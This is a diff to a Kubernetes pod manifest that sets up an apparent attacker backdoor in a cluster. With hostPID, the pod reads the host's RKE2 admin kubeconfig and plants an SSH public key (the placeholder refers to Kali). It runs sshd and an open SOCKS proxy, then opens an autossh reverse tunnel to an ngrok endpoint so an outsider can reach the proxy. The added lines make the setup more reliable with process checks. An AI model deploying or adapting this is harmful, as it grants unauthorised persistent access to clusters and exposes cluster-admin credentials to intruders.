@@ -8,29 +8,34 @@ spec:
   hostPID: true
   containers:
   - name: shell
-    image: alpine:3.19
+    image: nicolaka/netshoot:latest
     command:
-      - /bin/sh
+      - /bin/bash
       - -c
       - |
-        apk add --no-cache util-linux curl jq openssl redis bash openssh-server openssh-client autossh microsocks > /dev/null 2>&1
-        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
-        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
-
         export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+
+        echo "=== BIN CHECK ==="
+        for b in curl jq kubectl sshd autossh microsocks; do
+          command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
+        done
 
         # ---------- SSH SERVER NEL POD ----------
         ssh-keygen -A >/dev/null 2>&1
         mkdir -p /root/.ssh && chmod 700 /root/.ssh
         cat > /root/.ssh/authorized_keys <<'EOF'
-        PASTE_KALI_PUBKEY_HERE
+        ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com
         EOF
         chmod 600 /root/.ssh/authorized_keys
         /usr/sbin/sshd -D &
+        sleep 1
+        pgrep -a sshd && echo "OK: sshd running" || echo "MISSING: sshd not running"
         # ---------------------------------------
 
         # ---------- SOCKS NEL POD ----------
         microsocks -p 1080 -i 0.0.0.0 &
+        sleep 1
+        pgrep -a microsocks && echo "OK: microsocks running" || echo "MISSING: microsocks not running"
         # ----------------------------------
 
         # ---------- TUNNEL NGROK ----------
@@ -54,7 +59,8 @@ spec:
           -R 0.0.0.0:1080:localhost:1080 \
           -i /root/.ssh/id_ed25519 \
           tunnel@8.tcp.ngrok.io -p 20849
-        echo "TUNNEL_UP"
+        sleep 2
+        pgrep -a autossh && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"
         # ----------------------------------
 
         echo "=========================================="
